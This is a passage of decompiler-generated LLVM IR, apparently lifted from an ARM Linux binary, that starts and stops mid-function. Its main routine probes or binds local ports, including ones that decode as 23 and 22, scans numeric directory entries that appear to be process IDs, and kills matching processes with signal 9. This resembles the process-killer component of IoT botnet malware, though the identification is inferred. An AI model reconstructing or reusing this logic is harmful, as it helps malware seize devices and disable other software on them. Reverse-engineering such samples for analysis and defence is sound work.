  store i32 %v6_c964, i32* @r5, align 4
  store i32 %v9_c964, i32* @r6, align 4
  store i32 %v12_c964, i32* @r7, align 4
  store i32 %v15_c964, i32* @r8, align 4
  store i32 %v18_c964, i32* @sb, align 4
  store i32 %v21_c964, i32* @sl, align 4
  store i32 %v24_c964, i32* @fp, align 4
  store i32 %v27_c964, i32* @lr, align 4
  ret i32 %v0_ce68

dec_label_pc_ce7c:                                ; preds = %dec_label_pc_cb5c
  %v1_ce7c = add i32 %v0_ce7c, 1
  %v7_ce80 = icmp eq i32 %v0_ce7c, 0
  br i1 %v7_ce80, label %dec_label_pc_ce88, label %dec_label_pc_cb64

dec_label_pc_ce88:                                ; preds = %dec_label_pc_ce7c
  %v1_ce88 = add i32 %v0_cb6c, 3
  %v2_ce88 = inttoptr i32 %v1_ce88 to i8*
  %v3_ce88 = load i8, i8* %v2_ce88, align 1
  %v7_ce8c = icmp eq i8 %v3_ce88, 65
  br i1 %v7_ce8c, label %dec_label_pc_cea0, label %dec_label_pc_ce94

dec_label_pc_ce94:                                ; preds = %dec_label_pc_ce88, %dec_label_pc_cea0
  %v0_cb7482 = phi i32 [ %v0_cb7483, %dec_label_pc_ce88 ], [ 1, %dec_label_pc_cea0 ]
  br label %dec_label_pc_cb3c.backedge

dec_label_pc_cb3c.backedge:                       ; preds = %dec_label_pc_ce94, %dec_label_pc_cb68
  %v0_cb7481 = phi i32 [ %v0_cb7482, %dec_label_pc_ce94 ], [ %v0_cb7483, %dec_label_pc_cb68 ]
  %v0_ce7c73 = phi i32 [ %v1_ce7c, %dec_label_pc_ce94 ], [ %v0_cb68, %dec_label_pc_cb68 ]
  %v0_cb5c.pr70 = phi i32 [ 0, %dec_label_pc_ce94 ], [ %v0_cb5c.pr71, %dec_label_pc_cb68 ]
  %v0_cb3c = add i32 %v0_cb6c, 1
  %v1_cb3c = add i32 %v0_cb6c, 3
  %v2_cb3c = inttoptr i32 %v1_cb3c to i8*
  %v3_cb3c = load i8, i8* %v2_cb3c, align 1
  %v2_cb40 = icmp eq i8 %v3_cb3c, 0
  %v1_cb44 = add i32 %v0_cb4478, 1
  br i1 %v2_cb40, label %dec_label_pc_cb74, label %dec_label_pc_cb4c

dec_label_pc_cea0:                                ; preds = %dec_label_pc_ce88
  store i32 1, i32* @lr, align 4
  br label %dec_label_pc_ce94

dec_label_pc_cea8:                                ; preds = %dec_label_pc_cbec
  %v1_ceac = call i32 @function_fcc4(i32 15)
  %v1_ceb4 = call i32 @function_fcc4(i32 16)
  %v1_cebc = call i32 @function_fcc4(i32 17)
  %v1_cec4 = call i32 @function_fcc4(i32 19)
  br label %dec_label_pc_ce68

dec_label_pc_cecc:                                ; preds = %dec_label_pc_c964
  store i8 48, i8* %stack_var_-72, align 1
  br label %dec_label_pc_ca10

; uselistorder directives
  uselistorder i32 %v1_cb44, { 1, 0 }
  uselistorder i8 %v3_cb3c, { 1, 0 }
  uselistorder i32 %v0_cb7481, { 1, 0 }
  uselistorder i32 %v1_ce7c, { 1, 0 }
  uselistorder i32 %v2_ce30, { 1, 0 }
  uselistorder i32 %v1_cba0, { 1, 0 }
  uselistorder i32 %v0_cbac30, { 1, 0 }
  uselistorder i32 %v1_cbc4, { 0, 3, 1, 2 }
  uselistorder i32 %v0_cb68, { 1, 0 }
  uselistorder i32 %v0_cb4478, { 1, 0 }
  uselistorder i32 %v0_ce7c, { 4, 3, 0, 1, 2 }
  uselistorder i32 %v0_cb7483, { 1, 2, 0 }
  uselistorder i32 %v1_cb4454, { 1, 0 }
  uselistorder i32 %v2_cb28, { 1, 0 }
  uselistorder i32 %v1_cb24, { 3, 1, 0, 2, 4 }
  uselistorder i32 %v1_cae4, { 0, 2, 1 }
  uselistorder i32 %v0_cae416, { 1, 0 }
  uselistorder i32 %v1_cab0, { 0, 2, 3, 4, 5, 6, 1 }
  uselistorder i32 %v2_ca40, { 1, 2, 0 }
  uselistorder i32 %v0_c9e8, { 1, 0 }
  uselistorder i32 %v2_c9e4, { 1, 0, 2 }
  uselistorder i8* %v2_c9cc, { 1, 0, 2 }
  uselistorder i32 %v2_c9ac, { 1, 2, 3, 0, 4, 5 }
  uselistorder i8* %stack_var_-585, { 1, 4, 0, 2, 3 }
  uselistorder i8* %stack_var_-72, { 2, 0, 1 }
  uselistorder i32* %stack_var_-56, { 0, 1, 2, 4, 3 }
  uselistorder i32 (i8*, i32, i32)* @function_1057c, { 1, 0 }
  uselistorder label %dec_label_pc_ce94, { 1, 0 }
  uselistorder label %dec_label_pc_ce68, { 1, 2, 0 }
  uselistorder label %dec_label_pc_ce48, { 1, 0 }
  uselistorder label %dec_label_pc_ce3c, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_ce24, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_cd34, { 1, 0 }
  uselistorder label %dec_label_pc_cd34thread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_cd1c.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_cc38, { 1, 0 }
  uselistorder label %dec_label_pc_cc38.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_cc28.loopexit, { 2, 1, 0 }
  uselistorder label %dec_label_pc_cbc0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_cb68, { 2, 0, 1 }
  uselistorder label %dec_label_pc_cb4c, { 1, 0 }
  uselistorder label %dec_label_pc_caf0, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_ca54.backedge, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_caa4, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_ca6c, { 1, 0 }
  uselistorder label %dec_label_pc_ca10, { 1, 0 }
}

define i32 @function_cef8(i32 %arg1) local_unnamed_addr {
dec_label_pc_cef8:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-8404 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-212 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-4264 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-232 = alloca i32, align 4
  %v3_cef8 = load i32, i32* @r4, align 4
  %v6_cef8 = load i32, i32* @r5, align 4
  %v9_cef8 = load i32, i32* @r6, align 4
  %v12_cef8 = load i32, i32* @r7, align 4
  %v15_cef8 = load i32, i32* @r8, align 4
  %v18_cef8 = load i32, i32* @sb, align 4
  %v21_cef8 = load i32, i32* @sl, align 4
  %v24_cef8 = load i32, i32* @fp, align 4
  %v27_cef8 = load i32, i32* @lr, align 4
  %v2_cf08 = call i32 @function_10a5c(i32* null)
  store i32 %v2_cf08, i32* @r0, align 4
  store i32 %v2_cf08, i32* @r7, align 4
  %v0_cf10 = call i32 @function_10acc()
  %v7_cf14 = icmp eq i32 %v0_cf10, -1
  %. = zext i1 %v7_cf14 to i32
  %tmp157 = icmp slt i32 %v0_cf10, 1
  %storemerge126 = select i1 %tmp157, i32 %., i32 1
  store i32 %storemerge126, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_20a64.58 to i32), i32* %r3.global-to-local, align 4
  %v2_cf30 = icmp eq i32 %storemerge126, 0
  store i32 %v0_cf10, i32* @global_var_20a64.58, align 4
  br i1 %v2_cf30, label %dec_label_pc_cf4c, label %dec_label_pc_cf3c

dec_label_pc_cf3c:                                ; preds = %dec_label_pc_d1b4, %dec_label_pc_d09c, %dec_label_pc_cef8
  %v1_cf48 = phi i32 [ %v2_d150, %dec_label_pc_d09c ], [ %v0_cf10, %dec_label_pc_cef8 ], [ 0, %dec_label_pc_d1b4 ]
  store i32 %v3_cef8, i32* @r4, align 4
  store i32 %v6_cef8, i32* @r5, align 4
  store i32 %v9_cef8, i32* @r6, align 4
  store i32 %v12_cef8, i32* @r7, align 4
  store i32 %v15_cef8, i32* @r8, align 4
  store i32 %v18_cef8, i32* @sb, align 4
  store i32 %v21_cef8, i32* @sl, align 4
  store i32 %v24_cef8, i32* @fp, align 4
  store i32 %v27_cef8, i32* @lr, align 4
  ret i32 %v1_cf48

dec_label_pc_cf4c:                                ; preds = %dec_label_pc_cef8
  %v2_cf4c = ptrtoint i32* %stack_var_-232 to i32
  store i32 %v2_cf4c, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-68, align 4
  %v1_cf60 = call i32 @function_c964(i32 5888)
  store i32 %v2_cf4c, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_cf74 = load i32, i32* @r5, align 4
  store i32 %v0_cf74, i32* %r2.global-to-local, align 4
  %v3_cf7c = call i32 @function_115f4(i32 2, i32 1, i32 %v0_cf74)
  %v7_cf80 = icmp eq i32 %v3_cf7c, -1
  store i32 %v3_cf7c, i32* @r4, align 4
  br i1 %v7_cf80, label %dec_label_pc_cfa8, label %dec_label_pc_cf8c

dec_label_pc_cf8c:                                ; preds = %dec_label_pc_cf4c
  %v2_cf90 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_cf90, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_cf98 = call i32 @function_113a4(i32 %v3_cf7c, i32 %v2_cf90, i32 16)
  %v0_cf9c = load i32, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_cfa4 = call i32 @function_11490(i32 %v0_cf9c, i32 1)
  br label %dec_label_pc_cfa8

dec_label_pc_cfa8:                                ; preds = %dec_label_pc_cf4c, %dec_label_pc_cf8c
  %v1_cfac = call i32 @function_c964(i32 5632)
  store i32 %v2_cf4c, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_cfc0 = load i32, i32* @r5, align 4
  store i32 %v0_cfc0, i32* %r2.global-to-local, align 4
  %v3_cfc8 = call i32 @function_115f4(i32 2, i32 1, i32 %v0_cfc0)
  %v7_cfcc = icmp eq i32 %v3_cfc8, -1
  store i32 %v3_cfc8, i32* @r4, align 4
  br i1 %v7_cfcc, label %dec_label_pc_cff4, label %dec_label_pc_cfd8

dec_label_pc_cfd8:                                ; preds = %dec_label_pc_cfa8
  %v2_cfdc = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_cfdc, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_cfe4 = call i32 @function_113a4(i32 %v3_cfc8, i32 %v2_cfdc, i32 16)
  %v0_cfe8 = load i32, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_cff0 = call i32 @function_11490(i32 %v0_cfe8, i32 1)
  br label %dec_label_pc_cff4

dec_label_pc_cff4:                                ; preds = %dec_label_pc_cfa8, %dec_label_pc_cfd8
  %v1_cffc = call i32 @function_c964(i32 58811)
  store i32 -6725, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_d014 = load i32, i32* @r5, align 4
  store i32 %v0_d014, i32* %r2.global-to-local, align 4
  %v3_d01c = call i32 @function_115f4(i32 2, i32 1, i32 %v0_d014)
  %v7_d020 = icmp eq i32 %v3_d01c, -1
  store i32 %v3_d01c, i32* @r4, align 4
  br i1 %v7_d020, label %dec_label_pc_d048, label %dec_label_pc_d02c

dec_label_pc_d02c:                                ; preds = %dec_label_pc_cff4
  %v2_d030 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_d030, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_d038 = call i32 @function_113a4(i32 %v3_d01c, i32 %v2_d030, i32 16)
  %v0_d03c = load i32, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_d044 = call i32 @function_11490(i32 %v0_d03c, i32 1)
  br label %dec_label_pc_d048

dec_label_pc_d048:                                ; preds = %dec_label_pc_cff4, %dec_label_pc_d02c
  %v1_d050 = call i32 @function_c964(i32 50951)
  store i32 -14585, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_d068 = load i32, i32* @r5, align 4
  store i32 %v0_d068, i32* %r2.global-to-local, align 4
  %v3_d070 = call i32 @function_115f4(i32 2, i32 1, i32 %v0_d068)
  %v7_d074 = icmp eq i32 %v3_d070, -1
  store i32 %v3_d070, i32* @r4, align 4
  br i1 %v7_d074, label %dec_label_pc_d09c, label %dec_label_pc_d080

dec_label_pc_d080:                                ; preds = %dec_label_pc_d048
  %v2_d084 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_d084, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_d08c = call i32 @function_113a4(i32 %v3_d070, i32 %v2_d084, i32 16)
  %v0_d090 = load i32, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_d098 = call i32 @function_11490(i32 %v0_d090, i32 1)
  br label %dec_label_pc_d09c

dec_label_pc_d09c:                                ; preds = %dec_label_pc_d048, %dec_label_pc_d080
  %v1_d0a0 = call i32 @function_12f00(i32 5)
  store i32 4096, i32* @r0, align 4
  %v0_d0a8 = call i32 @function_1183c()
  store i32 ptrtoint (i32* @global_var_1e9d8.63 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_20a60.65 to i32), i32* %r1.global-to-local, align 4
  store i32 %v0_d0a8, i32* %r2.global-to-local, align 4
  %v0_d0b8 = load i32, i32* @r5, align 4
  %v1_d0b8 = trunc i32 %v0_d0b8 to i8
  %v3_d0b8 = inttoptr i32 %v0_d0a8 to i8*
  store i8 %v1_d0b8, i8* %v3_d0b8, align 1
  %v0_d0c0 = load i32, i32* @r5, align 4
  %v1_d0c0 = load i32, i32* %r3.global-to-local, align 4
  %v2_d0c0 = inttoptr i32 %v1_d0c0 to i32*
  store i32 %v0_d0c0, i32* %v2_d0c0, align 4
  %v0_d0c4 = load i32, i32* %r2.global-to-local, align 4
  %v1_d0c4 = load i32, i32* %r1.global-to-local, align 4
  %v2_d0c4 = inttoptr i32 %v1_d0c4 to i32*
  store i32 %v0_d0c4, i32* %v2_d0c4, align 4
  %v1_d0c8 = call i32 @function_fd64(i32 15)
  %v1_d0d0 = call i32 @function_fd64(i32 16)
  %v2_d0d4 = ptrtoint i32* %stack_var_-4264 to i32
  store i32 %v2_d0d4, i32* %r2.global-to-local, align 4
  %v0_d0d8 = load i32, i32* @r5, align 4
  store i32 %v0_d0d8, i32* %r1.global-to-local, align 4
  %v2_d0e4 = inttoptr i32 %v0_d0d8 to i32*
  %v3_d0e4 = call i32 @function_fca0(i32 15, i32* %v2_d0e4)
  %v1_d0ec = add i32 %v2_d0d4, -44
  store i32 %v1_d0ec, i32* %r3.global-to-local, align 4
  store i32 %v3_d0e4, i32* %r1.global-to-local, align 4
  store i32 %v1_d0ec, i32* @r0, align 4
  %v2_d0fc = inttoptr i32 %v1_d0ec to i8*
  %v3_d0fc = call i32 @function_10344(i8* %v2_d0fc, i32 %v3_d0e4)
  store i32 %v3_d0fc, i32* @r0, align 4
  %v2_d104 = add i32 %v3_d0fc, %v1_d0ec
  store i32 %v2_d104, i32* @r4, align 4
  %v0_d108 = call i32 @function_10a48()
  %v2_d110 = ptrtoint i32* %stack_var_-84 to i32
  store i32 %v2_d110, i32* %r2.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v3_d118 = trunc i32 %v0_d108 to i8
  %v4_d118 = call i32 @function_1077c(i8 %v3_d118, i32 10, i32 %v2_d110)
  store i32 %v4_d118, i32* %r1.global-to-local, align 4
  %v0_d120 = load i32, i32* @r4, align 4
  store i32 %v0_d120, i32* @r0, align 4
  %v2_d124 = inttoptr i32 %v0_d120 to i8*
  %v3_d124 = call i32 @function_10344(i8* %v2_d124, i32 %v4_d118)
  %v0_d128 = load i32, i32* @r5, align 4
  store i32 %v0_d128, i32* %r1.global-to-local, align 4
  %v1_d12c = load i32, i32* @r4, align 4
  %v2_d12c = add i32 %v1_d12c, %v3_d124
  store i32 %v2_d12c, i32* @r4, align 4
  %v2_d134 = inttoptr i32 %v0_d128 to i32*
  %v3_d134 = call i32 @function_fca0(i32 16, i32* %v2_d134)
  store i32 %v3_d134, i32* %r1.global-to-local, align 4
  %v0_d13c = load i32, i32* @r4, align 4
  store i32 %v0_d13c, i32* @r0, align 4
  %v2_d140 = inttoptr i32 %v0_d13c to i8*
  %v3_d140 = call i32 @function_10344(i8* %v2_d140, i32 %v3_d134)
  %v0_d144 = load i32, i32* @r5, align 4
  store i32 %v0_d144, i32* %r1.global-to-local, align 4
  store i32 %v3_d140, i32* @r6, align 4
  %v2_d150 = call i32 @function_109e8(i32 %v1_d0ec, i32 %v0_d144)
  %v7_d154 = icmp eq i32 %v2_d150, -1
  br i1 %v7_d154, label %dec_label_pc_cf3c, label %dec_label_pc_d15c

dec_label_pc_d15c:                                ; preds = %dec_label_pc_d09c
  %v1_d15c = call i32 @function_10ddc(i32 %v2_d150)
  %v1_d164 = call i32 @function_fcc4(i32 15)
  %v1_d16c = call i32 @function_fcc4(i32 16)
  store i32 ptrtoint (i32* @global_var_20a60.65 to i32), i32* %r3.global-to-local, align 4
  %v2_d178 = load i32, i32* @global_var_20a60.65, align 4
  store i32 %v2_d178, i32* %r1.global-to-local, align 4
  store i32 4095, i32* %r2.global-to-local, align 4
  %v3_d184 = call i32 @function_10b40(i32 %v1_d0ec, i32 %v2_d178, i32 4095)
  %v7_d188 = icmp eq i32 %v3_d184, -1
  br i1 %v7_d188, label %.thread9, label %bb160

bb160:                                            ; preds = %dec_label_pc_d15c
  store i32 ptrtoint (i32* @global_var_20a60.65 to i32), i32* @ip, align 4
  %v3_d190 = load i32, i32* @global_var_20a60.65, align 4
  store i32 %v3_d190, i32* %r3.global-to-local, align 4
  %v1_d194 = load i32, i32* @r5, align 4
  %v2_d194 = trunc i32 %v1_d194 to i8
  %v5_d194 = add i32 %v3_d190, %v3_d184
  %v6_d194 = inttoptr i32 %v5_d194 to i8*
  store i8 %v2_d194, i8* %v6_d194, align 1
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_d15c, %bb160
  store i32 %v1_d0ec, i32* @r0, align 4
  %v0_d19c = load i32, i32* @r6, align 4
  %v1_d19c = load i32, i32* @r4, align 4
  %v1_d0ec.neg = sub i32 44, %v2_d0d4
  %v2_d19c = add i32 %v1_d0ec.neg, %v0_d19c
  %v2_d1a0 = add i32 %v2_d19c, %v1_d19c
  store i32 %v2_d1a0, i32* @r1, align 4
  %v0_d1a4 = call i32 @function_103b0()
  %v0_d1a8 = load i32, i32* @r7, align 4
  store i32 %v0_d1a8, i32* @r4, align 4
  %v0_d1ac = load i32, i32* @r5, align 4
  store i32 400, i32* @r5, align 4
  %v2_d2b8 = ptrtoint i32* %stack_var_-148 to i32
  %v2_d2bc = bitcast i32* %stack_var_-148 to i8*
  %v2_d308 = ptrtoint i32* %stack_var_-212 to i32
  %v2_d30c = bitcast i32* %stack_var_-212 to i8*
  %v2_d468 = ptrtoint i32* %stack_var_-44 to i32
  %v2_d478 = ptrtoint i32* %stack_var_-48 to i32
  %v2_d490 = ptrtoint i32* %stack_var_-52 to i32
  %v2_d4a4 = ptrtoint i32* %stack_var_-8404 to i32
  br label %dec_label_pc_d1b4

dec_label_pc_d1b4:                                ; preds = %dec_label_pc_d27c, %.thread9
  %stack_var_-8412.0 = phi i32 [ %v0_d1ac, %.thread9 ], [ %stack_var_-8412.3, %dec_label_pc_d27c ]
  %v1_d1b8 = call i32 @function_fd64(i32 15)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_d1c4 = call i32 @function_fca0(i32 15, i32* null)
  %v1_d1c8 = call i32 @function_10fd8(i32 %v3_d1c4)
  store i32 %v1_d1c8, i32* @sb, align 4
  %v2_d1cc = icmp eq i32 %v1_d1c8, 0
  br i1 %v2_d1cc, label %dec_label_pc_cf3c, label %dec_label_pc_d1d4

dec_label_pc_d1d4:                                ; preds = %dec_label_pc_d1b4
  %v1_d1d8 = call i32 @function_fcc4(i32 15)
  %v0_d1dc80 = load i32, i32* @sb, align 4
  %v1_d1e081 = inttoptr i32 %v0_d1dc80 to i32*
  %v2_d1e082 = call i32 @function_1111c(i32* %v1_d1e081)
  %v2_d1e484 = icmp eq i32 %v2_d1e082, 0
  br i1 %v2_d1e484, label %dec_label_pc_d27c, label %dec_label_pc_d1ec.preheader

dec_label_pc_d1ec.preheader:                      ; preds = %dec_label_pc_d1d4, %dec_label_pc_d1dc.backedge
  %v0_d1ec93 = phi i32 [ %v2_d1e0, %dec_label_pc_d1dc.backedge ], [ %v2_d1e082, %dec_label_pc_d1d4 ]
  %stack_var_-8412.185 = phi i32 [ %stack_var_-8412.1.be, %dec_label_pc_d1dc.backedge ], [ %stack_var_-8412.0, %dec_label_pc_d1d4 ]
  br label %dec_label_pc_d1ec

dec_label_pc_d1ec:                                ; preds = %dec_label_pc_d1ec.preheader, %dec_label_pc_d264
  %v0_d1fc = phi i32 [ %v2_d270, %dec_label_pc_d264 ], [ %v0_d1ec93, %dec_label_pc_d1ec.preheader ]
  %stack_var_-8412.2 = phi i32 [ %v1_d210, %dec_label_pc_d264 ], [ %stack_var_-8412.185, %dec_label_pc_d1ec.preheader ]
  %v1_d1ec = add i32 %v0_d1fc, 11
  %v2_d1ec = inttoptr i32 %v1_d1ec to i8*
  %v3_d1ec = load i8, i8* %v2_d1ec, align 1
  %v4_d1ec = zext i8 %v3_d1ec to i32
  %v1_d1f0 = add nsw i32 %v4_d1ec, -48
  store i32 %v1_d1f0, i32* %r3.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_d1f0, 9
  br i1 %tmp, label %dec_label_pc_d1dc.backedge, label %dec_label_pc_d1fc

dec_label_pc_d1fc:                                ; preds = %dec_label_pc_d1ec
  store i32 %v1_d1ec, i32* @r6, align 4
  store i32 %v1_d1ec, i32* @r0, align 4
  %v1_d204 = call i32 @function_12c4c(i32 %v1_d1ec)
  %v0_d20c = load i32, i32* @r5, align 4
  %v1_d210 = add i32 %stack_var_-8412.2, 1
  store i32 %v1_d210, i32* %r1.global-to-local, align 4
  store i32 %v1_d204, i32* @r7, align 4
  %v5_d21c = icmp slt i32 %v0_d20c, %v1_d204
  %v2_d28c = call i32 @function_10a5c(i32* null)
  br i1 %v5_d21c, label %dec_label_pc_d288, label %dec_label_pc_d220

dec_label_pc_d220:                                ; preds = %dec_label_pc_d1fc
  %v0_d228 = load i32, i32* @r4, align 4
  %v2_d228 = sub i32 %v2_d28c, %v0_d228
  %v7_d230 = icmp slt i32 %v2_d228, 601
  br i1 %v7_d230, label %dec_label_pc_d238, label %.thread10

.thread10:                                        ; preds = %dec_label_pc_d220
  store i32 400, i32* @r5, align 4
  br label %dec_label_pc_d1dc.backedge

dec_label_pc_d238:                                ; preds = %dec_label_pc_d220
  %v0_d238 = load i32, i32* @r7, align 4
  %v7_d23c = icmp slt i32 %v0_d238, 401
  br i1 %v7_d23c, label %dec_label_pc_d1dc.backedge, label %dec_label_pc_d240

dec_label_pc_d240:                                ; preds = %dec_label_pc_d238
  %v3_d248 = zext i32 %v1_d210 to i64
  %v4_d248 = mul nuw i64 %v3_d248, 3435973837
  %v3_d24c1 = udiv i64 %v4_d248, 34359738368
  %v3_d2503 = mul nuw nsw i64 %v3_d24c1, 8
  %v3_d250 = trunc i64 %v3_d2503 to i32
  store i32 %v3_d250, i32* %r3.global-to-local, align 4
  %v2_d2545 = mul nuw nsw i64 %v3_d24c1, 2
  %v2_d254 = trunc i64 %v2_d2545 to i32
  %v2_d258 = add i32 %v3_d250, %v2_d254
  store i32 %v2_d258, i32* %r2.global-to-local, align 4
  %v9_d25c = icmp eq i32 %v1_d210, %v2_d258
  br i1 %v9_d25c, label %dec_label_pc_d264, label %dec_label_pc_d1dc.backedge

dec_label_pc_d264:                                ; preds = %dec_label_pc_d240
  %v1_d268 = call i32 @function_12f00(i32 1)
  %v0_d26c = load i32, i32* @sb, align 4
  %v1_d270 = inttoptr i32 %v0_d26c to i32*
  %v2_d270 = call i32 @function_1111c(i32* %v1_d270)
  %v2_d274 = icmp eq i32 %v2_d270, 0
  br i1 %v2_d274, label %dec_label_pc_d27c, label %dec_label_pc_d1ec

dec_label_pc_d27c:                                ; preds = %dec_label_pc_d1dc.backedge, %dec_label_pc_d264, %dec_label_pc_d1d4
  %stack_var_-8412.3 = phi i32 [ %stack_var_-8412.0, %dec_label_pc_d1d4 ], [ %v1_d210, %dec_label_pc_d264 ], [ %stack_var_-8412.1.be, %dec_label_pc_d1dc.backedge ]
  %v0_d27c = load i32, i32* @sb, align 4
  %v1_d280 = inttoptr i32 %v0_d27c to i32*
  %v2_d280 = call i32 @function_10e10(i32* %v1_d280)
  br label %dec_label_pc_d1b4

dec_label_pc_d288:                                ; preds = %dec_label_pc_d1fc
  %v1_d298 = call i32 @function_fd64(i32 15)
  %v1_d2a0 = call i32 @function_fd64(i32 16)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_d2ac = call i32 @function_fca0(i32 15, i32* null)
  store i32 %v3_d2ac, i32* %r1.global-to-local, align 4
  store i32 %v2_d2b8, i32* @r0, align 4
  %v3_d2bc = call i32 @function_10344(i8* %v2_d2bc, i32 %v3_d2ac)
  %v2_d2c8 = add i32 %v3_d2bc, %v2_d2b8
  store i32 %v2_d2c8, i32* %r5.global-to-local, align 4
  store i32 %v2_d2c8, i32* @r0, align 4
  %v0_d2d0 = load i32, i32* @r6, align 4
  store i32 %v0_d2d0, i32* %r1.global-to-local, align 4
  %v2_d2d4 = inttoptr i32 %v2_d2c8 to i8*
  %v3_d2d4 = call i32 @function_10344(i8* %v2_d2d4, i32 %v0_d2d0)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_d2e4 = call i32 @function_fca0(i32 16, i32* null)
  store i32 %v3_d2e4, i32* %r1.global-to-local, align 4
  %v1_d2ec = load i32, i32* %r5.global-to-local, align 4
  %v2_d2ec = add i32 %v1_d2ec, %v3_d2d4
  store i32 %v2_d2ec, i32* @r0, align 4
  %v2_d2f0 = inttoptr i32 %v2_d2ec to i8*
  %v3_d2f0 = call i32 @function_10344(i8* %v2_d2f0, i32 %v3_d2e4)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_d2fc = call i32 @function_fca0(i32 15, i32* null)
  store i32 %v3_d2fc, i32* %r1.global-to-local, align 4
  store i32 %v2_d308, i32* @r0, align 4
  %v3_d30c = call i32 @function_10344(i8* %v2_d30c, i32 %v3_d2fc)
  store i32 %v2_d308, i32* %r2.global-to-local, align 4
  %v2_d318 = add i32 %v3_d30c, %v2_d308
  store i32 %v2_d318, i32* @r5, align 4
  %v0_d31c = load i32, i32* @r6, align 4
  store i32 %v0_d31c, i32* %r1.global-to-local, align 4
  store i32 %v2_d318, i32* @r0, align 4
  %v2_d324 = inttoptr i32 %v2_d318 to i8*
  %v3_d324 = call i32 @function_10344(i8* %v2_d324, i32 %v0_d31c)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v3_d324, i32* @r4, align 4
  %v3_d334 = call i32 @function_fca0(i32 32, i32* null)
  store i32 %v3_d334, i32* %r1.global-to-local, align 4
  %v0_d33c = load i32, i32* @r4, align 4
  %v1_d33c = load i32, i32* @r5, align 4
  %v2_d33c = add i32 %v1_d33c, %v0_d33c
  store i32 %v2_d33c, i32* @r0, align 4
  %v2_d340 = inttoptr i32 %v2_d33c to i8*
  %v3_d340 = call i32 @function_10344(i8* %v2_d340, i32 %v3_d334)
  %v1_d348 = call i32 @function_fcc4(i32 15)
  %v1_d350 = call i32 @function_fcc4(i32 16)
  store i32 %v1_d0ec, i32* %r1.global-to-local, align 4
  store i32 4095, i32* @r2, align 4
  %v3_d368 = call i32 @function_10b40(i32 %v2_d2b8, i32 %v1_d0ec, i32 4095)
  %v7_d36c = icmp eq i32 %v3_d368, -1
  store i32 %v3_d368, i32* @r5, align 4
  br i1 %v7_d36c, label %dec_label_pc_d430, label %dec_label_pc_d378

dec_label_pc_d378:                                ; preds = %dec_label_pc_d288
  store i32 %v1_d0ec, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v4_d380 = add i32 %v3_d368, %v1_d0ec
  %v5_d380 = inttoptr i32 %v4_d380 to i8*
  store i8 0, i8* %v5_d380, align 1
  %v1_d388 = call i32 @function_fd64(i32 33)
  %v0_d38c = load i32, i32* @r4, align 4
  store i32 %v0_d38c, i32* %r1.global-to-local, align 4
  %v2_d394 = inttoptr i32 %v0_d38c to i32*
  %v3_d394 = call i32 @function_fca0(i32 33, i32* %v2_d394)
  %v0_d398 = load i32, i32* @r5, align 4
  %v1_d398 = add i32 %v0_d398, -1
  store i32 %v1_d398, i32* @r1, align 4
  store i32 %v3_d394, i32* %r2.global-to-local, align 4
  %v4_d3a4 = call i32 @function_1066c(i8* %v2_d0fc, i32 %v1_d398, i32 %v3_d394)
  %v7_d3a8 = icmp eq i32 %v4_d3a4, -1
  br i1 %v7_d3a8, label %dec_label_pc_d3c4, label %dec_label_pc_d3b0

dec_label_pc_d3b0:                                ; preds = %dec_label_pc_d378
  %v1_d3b4 = call i32 @function_109b4(i32 %v1_d0ec)
  %v0_d3b8 = load i32, i32* @r7, align 4
  store i32 9, i32* %r1.global-to-local, align 4
  %v2_d3c0 = call i32 @function_10ba8(i32 %v0_d3b8, i32 9)
  br label %dec_label_pc_d3c4

dec_label_pc_d3c4:                                ; preds = %dec_label_pc_d378, %dec_label_pc_d3b0
  %v1_d3c8 = call i32 @function_fcc4(i32 33)
